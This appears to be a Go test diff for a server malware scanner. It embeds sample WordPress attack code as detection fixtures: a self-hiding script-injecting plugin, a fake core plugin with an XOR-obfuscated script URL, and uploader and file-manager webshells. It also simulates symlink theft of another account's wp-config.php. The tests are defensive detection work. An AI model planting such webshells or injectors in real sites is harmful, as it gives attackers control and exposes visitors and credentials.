@@ -1133,3 +1133,115 @@ func TestFleetStringsAndHTMLAreNoCode(t *testing.T) {
 		}
 	}
 }
+
+// server1 (2026-10-28): plugins uploaded through wp-admin with known
+// passwords - a plugin hiding itself and printing a script to visitors, a
+// fake core plugin loading a script by an XOR-ed URL - and the shells next
+// to them. None had a finding. Inert shapes, then look-alikes.
+func TestFleetUploadedPluginCampaign(t *testing.T) {
+	b64 := strings.Repeat(strings.Repeat("QUJD", 19)+"\n", 300)
+	ints := strings.TrimSuffix(strings.Repeat("152,229,232,", 12), ",")
+	hide := "add_filter( 'all_plugins', function( $plugins ) {\n    unset( $plugins[ plugin_basename( __FILE__ ) ] );\n    return $plugins;\n}, 23 );\n"
+	kit := map[string]struct{ sig, body string }{
+		"self-hiding injector": {"PHP.Backdoor.SelfHidingInjector", "<?php\n/* Plugin Name: wp-warden */\n" + hide +
+			"function w_src() { $raw = <<<'_B'\n" + b64 + "_B;\n return base64_decode($raw); }\n" +
+			"function w_out() { if (is_admin()) return; echo '<scr' . 'ipt>' . w_src() . '</scr' . 'ipt>'; }\nadd_action( 'wp_head', 'w_out', 1 );\n"},
+		"XOR-ed script URL": {"PHP.Injector.HiddenScriptURL", "<?php\n/* Plugin Name: WP-CORE */\nfunction h($b, $k) { $o = ''; for ($i = 0; $i < count($b); $i++) { $o .= chr($b[$i] ^ ord($k[$i % strlen($k)])); } return $o; }\n" +
+			"function src() { $k = implode('', array_map('chr', [240,145,156])); return h([" + ints + "], $k); }\n" +
+			"add_action('wp_enqueue_scripts', function () { $src = src(); wp_enqueue_script('wp-core', $src, array(), '1', true); });\n"},
+		"uploader": {"PHP.Webshell.Uploader", "<?php\necho \"<title>uploader</title>\";\nif (isset($_POST['Submit'])) { $n = $_FILES['image']['name']; @move_uploaded_file($_FILES['image']['tmp_name'], $n); echo $n; }\n" +
+			"else { echo '<form method=\"POST\" enctype=\"multipart/form-data\"><input type=\"file\" name=\"image\"><input type=\"submit\" name=\"Submit\"></form>'; }\n"},
+		"file manager": {"PHP.Webshell.FileManager", "<?php\n@ini_set('open_basedir', NULL);\n$p = isset($_GET['p']) ? $_GET['p'] : '.';\n$items = scandir($p);\n" +
+			"if (isset($_POST['save'])) { file_put_contents($_GET['edit'], $_POST['content']); }\nif (isset($_FILES['upload'])) { move_uploaded_file($_FILES['upload']['tmp_name'], $p . '/x'); }\n" +
+			"if (isset($_GET['delete'])) { unlink($_GET['delete']); }\nif (isset($_POST['newname'])) { rename($_POST['oldname'], $_POST['newname']); }\n"},
+		"escaped request names": {"PHP.Obfuscated.EscapedInput", "<?php\ngoto a; a: $v = $_GET[\"\\x76\\151\\x65\\x77\"];\ngoto b; b: if (isset($_FILES[\"\\x66\\151\\x6c\\145\"])) { echo $v; }\n"},
+	}
+	for name, k := range kit {
+		if d := analyze(".php", []byte(k.body)); d == nil || d.Signature != k.sig || d.Category != CatVirus {
+			t.Errorf("%s: want %s, got %+v", name, k.sig, d)
+		}
+	}
+	for name, body := range map[string]string{
+		// MainWP-style: hidden by a setting; a white-label plugin hidden
+		// with no script for visitors; an analytics snippet printed but not hidden.
+		"hidden by a setting": "<?php\nadd_filter('all_plugins', function ($p) { if (get_option('hide_child')) { unset($p[plugin_basename(__FILE__)]); } return $p; });\n" +
+			"add_action('wp_head', function () { echo '<scr' . 'ipt>var a=1;</scr' . 'ipt>'; });\n",
+		"white label": "<?php\n" + hide + "add_action('admin_menu', function () { remove_menu_page('tools.php'); });\n",
+		"analytics":   "<?php\nadd_action('wp_head', function () { echo '<script async src=\"https://www.googletagmanager.com/gtag/js?id=G-X\"></script>'; });\n",
+		// A script from the plugin's own folder, and XOR without a script.
+		"own script":  "<?php\nadd_action('wp_enqueue_scripts', function () { $src = plugins_url('a.js', __FILE__); wp_enqueue_script('a', $src); });\n",
+		"XOR licence": "<?php\nfunction d($b, $k) { $o = ''; foreach ($b as $i => $c) { $o .= chr($c ^ ord($k[$i % 3])); } return $o; }\n$key = d([" + ints + "], 'abc');\nwp_enqueue_script('a', plugins_url('a.js', __FILE__));\n",
+		// Upload handlers that check what they get, or who sends it.
+		"checked upload": "<?php\n$ext = strtolower(pathinfo($_FILES['f']['name'], PATHINFO_EXTENSION));\nif (in_array($ext, ['jpg', 'png'])) { move_uploaded_file($_FILES['f']['tmp_name'], 'img/' . $_FILES['f']['name']); }\n" +
+			"echo '<form enctype=\"multipart/form-data\" method=\"post\"><input type=\"file\" name=\"f\"></form>';\n",
+		"logged-in upload": "<?php\nsession_start(); if (empty($_SESSION['user'])) { exit; }\nmove_uploaded_file($_FILES['f']['tmp_name'], 'files/' . $_FILES['f']['name']);\n" +
+			"echo '<form enctype=\"multipart/form-data\" method=\"post\"><input type=\"file\" name=\"f\"></form>';\n",
+		// A file manager that leaves open_basedir alone (judged by other rules).
+		"plain request names": "<?php\n$v = $_GET['view']; $f = $_FILES['file']; $x = $_POST[\"\\x61b\"];\n",
+	} {
+		if d := pluginInjectors([]byte(body), func(w string) bool { return strings.Contains(body, w) }); d != nil {
+			t.Errorf("%s: %+v", name, d)
+		}
+	}
+}
+
+// server1 (2026-10-30): the credential theft farm's links were made again
+// after a full scan quarantined them; symlink() writes no file, so realtime
+// protection never saw a link. A new link to another account's secrets is
+// now caught as it is made; a link the administrator restored stays.
+func TestRealtimeCatchesNewLinks(t *testing.T) {
+	if os.Geteuid() != 0 {
+		t.Skip("needs root to own files as another user")
+	}
+	s := newScanner(t)
+	if _, err := s.Settings.Patch([]byte(`{"scanner":{"virus_action":"quarantine"}}`)); err != nil {
+		t.Fatal(err)
+	}
+	dir := t.TempDir()
+	victim, thief := filepath.Join(dir, "victim"), filepath.Join(dir, "thief")
+	os.MkdirAll(filepath.Join(thief, "public_html/kit"), 0o755)
+	os.MkdirAll(victim, 0o711)
+	secret := filepath.Join(victim, "wp-config.php")
+	os.WriteFile(secret, []byte("<?php // inert"), 0o640)
+	os.Chown(victim, 65534, 65534)
+	os.Chown(secret, 65534, 65534)
+	homesCache.Lock()
+	homesCache.m, homesCache.at = map[uint32]string{65534: victim, 65533: thief}, time.Now()
+	homesCache.Unlock()
+	defer func() { homesCache.Lock(); homesCache.m = nil; homesCache.Unlock() }()
+
+	rt := &Realtime{S: s}
+	ctx, cancel := context.WithCancel(context.Background())
+	defer cancel()
+	if err := rt.init([]string{thief}); err != nil {
+		t.Skip("inotify unavailable:", err)
+	}
+	go rt.loop(ctx)
+	time.Sleep(300 * time.Millisecond)
+	link := filepath.Join(thief, "public_html/kit/victim-wp-config.txt")
+	os.Symlink(secret, link)
+	os.Lchown(link, 65533, 65533)
+	var f Finding
+	for deadline := time.Now().Add(10 * time.Second); time.Now().Before(deadline); time.Sleep(100 * time.Millisecond) {
+		if fs, _, _ := s.ListFindings(FindingFilter{}); len(fs) == 1 && fs[0].Status == "quarantined" {
+			f = fs[0]
+			break
+		}
+	}
+	if f.ID == 0 || f.Source != "realtime" || f.Category != CatSymlink {
+		t.Fatalf("new link not caught: %+v", f)
+	}
+	if _, err := os.Lstat(link); !os.IsNotExist(err) {
+		t.Fatal("link still there")
+	}
+	if err := s.Restore(f.ID); err != nil {
+		t.Fatal(err)
+	}
+	time.Sleep(2 * time.Second)
+	if _, err := os.Lstat(link); err != nil {
+		t.Fatalf("restored link taken again: %v", err)
+	}
+	if fs, _, _ := s.ListFindings(FindingFilter{}); len(fs) != 1 {
+		t.Fatalf("restored link recorded again: %+v", fs)
+	}
+}
